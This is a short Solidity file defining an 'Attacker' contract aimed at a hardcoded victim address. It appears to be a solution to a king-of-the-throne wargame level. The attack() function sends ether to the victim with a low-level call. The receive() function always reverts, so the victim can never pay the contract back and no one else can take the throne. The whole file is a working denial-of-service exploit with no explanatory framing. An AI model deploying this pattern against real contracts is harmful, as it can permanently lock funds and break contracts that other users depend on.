// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    address victim = 0x1Ad3c5754675562b78bA111D28b0cc41686b76D7;

    function attack() external payable {
        // We use call here instead transfer because transfer
        // has a gas limit and runs out of gas.
        (bool success, ) = payable(address(victim)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "you cannot claim the throne!");
    }
}